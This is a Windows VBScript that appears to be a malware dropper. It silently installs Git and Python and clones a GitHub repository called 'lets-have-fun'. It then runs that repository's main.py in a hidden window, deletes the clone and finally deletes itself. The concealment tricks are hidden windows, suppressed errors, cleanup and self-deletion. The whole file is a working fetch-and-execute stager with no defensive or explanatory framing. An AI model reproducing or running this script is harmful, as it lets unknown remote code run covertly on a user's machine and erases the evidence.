Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
Set oStream = CreateObject("ADODB.Stream")
On Error Resume Next

' Get TEMP path
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
WshShell.CurrentDirectory = tempDir
scriptPath = WScript.ScriptFullName

' Function to check if a command exists
Function CommandExists(cmd)
    Dim exec, output
    On Error Resume Next
    Set exec = WshShell.Exec("cmd /c where " & cmd)
    output = exec.StdOut.ReadAll
    CommandExists = (InStr(output, cmd) > 0)
End Function

' Function to download files
Sub DownloadFile(url, savePath)
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        oStream.Open
        oStream.Type = 1
        oStream.Write http.ResponseBody
        oStream.SaveToFile savePath, 2
        oStream.Close
    End If
End Sub

' Install Git if not present
If Not CommandExists("git") Then
    WScript.Echo "Git not found. Downloading and installing Git silently..."
    gitInstaller = tempDir & "\git_installer.exe"
    DownloadFile "https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe", gitInstaller
    WshShell.Run gitInstaller & " /VERYSILENT /NORESTART", 0, True
End If

' Install Python if not present
If Not CommandExists("python") Then
    WScript.Echo "Python not found. Downloading and installing Python silently..."
    pythonInstaller = tempDir & "\python_installer.exe"
    DownloadFile "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe", pythonInstaller
    WshShell.Run pythonInstaller & " /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1", 0, True
End If

' Optional: Check internet
If WshShell.Run("ping github.com -n 1", 0, True) <> 0 Then
    WScript.Echo "No internet connection. Exiting."
    WScript.Quit
End If

' Clone Repo
WshShell.CurrentDirectory = tempDir
gitCloneCommand = "git clone https://github.com/DarkImpact1/lets-have-fun.git"
If WshShell.Run(gitCloneCommand, 0, True) <> 0 Then
    WScript.Echo "Git clone failed."
    WScript.Quit
End If

' Install Requirements
WshShell.CurrentDirectory = tempDir & "\lets-have-fun"
pythonCommand = "python"
If WshShell.Run(pythonCommand & " -m pip install -r requirements.txt", 0, True) <> 0 Then
    WScript.Echo "Failed to install requirements."
    WScript.Quit
End If

' Run Python Script
WshShell.Run pythonCommand & " main.py", 0, True

' Cleanup
WshShell.CurrentDirectory = tempDir
WshShell.Run "cmd /c rd /s /q lets-have-fun", 0

' Self-delete after 5 seconds
WshShell.Run "cmd /c timeout 5 && del " & Chr(34) & scriptPath & Chr(34), 0

Set WshShell = Nothing
Set objFSO = Nothing
Set http = Nothing
Set oStream = Nothing
